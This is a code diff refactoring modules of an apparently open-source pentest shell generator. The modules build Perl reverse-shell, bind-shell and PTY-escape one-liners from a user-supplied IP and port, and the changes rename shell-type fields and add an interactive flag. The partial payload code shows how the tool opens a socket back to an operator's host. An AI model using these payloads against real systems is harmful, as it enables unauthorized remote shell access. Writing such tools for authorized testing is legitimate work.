@@ -13,11 +13,11 @@ class ReverseTCP(plugin.ReverseShell):
 
         self.opts.description = "[ReverseShell][TCP] Perl from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
-        self.shell_type = "tcp"
+        self.protocol = "tcp"
 
     def make_shell(self):
         self.shell = f"""perl -e 'use Socket;$i="{self.args.ip}";$p={self.args.port};"""
-        if self.shell_type == "udp":
+        if self.protocol == "udp":
             self.shell += """socket(S,PF_INET,SOCK_DGRAM,getprotobyname("udp"));if(connect(S,"""
         else:
             self.shell += """socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,"""
@@ -26,7 +26,7 @@ class ReverseTCP(plugin.ReverseShell):
         self.shell += """};'"""
 
 
-class PTY(plugin.Module):
+class PTY(plugin.BaseShell):
     def __init__(self):
         super().__init__()
         self.add_args(
@@ -37,7 +37,8 @@ class PTY(plugin.Module):
         )
         self.opts.description = "[PTYShell] Perl PTY shell escape from https://netsec.ws/?p=337"
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
-        self.shell_type = "pty"
+        self.shell_type = 0
+        self.is_interactive = True
 
     def make_shell(self):
         self.shell = f"""perl -e 'exec "{self.args.shell}"'"""
@@ -46,7 +47,9 @@ class PTY(plugin.Module):
 class ReverseUDP(ReverseTCP):
     def __init__(self):
         super().__init__()
-        self.shell_type = "udp"
+        self.shell_type = 1
+        self.is_interactive = True
+        self.protocol = "udp"
         self.opts.description = "[ReverseShell][UDP] Perl from swisskyrepo/PayloadsAllTheThings. License MIT."
 
 
@@ -59,7 +62,9 @@ class BindTCP(plugin.BindShell):
             choices=const.LINUX_SHELL,
             help="Select shell type on target machine"
         )
-        self.shell_type = "tcp"
+        self.shell_type = 2
+        self.is_interactive = True
+        self.protocol = "tcp"
         self.opts.description = "[BindShell][TCP] Perl from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
 
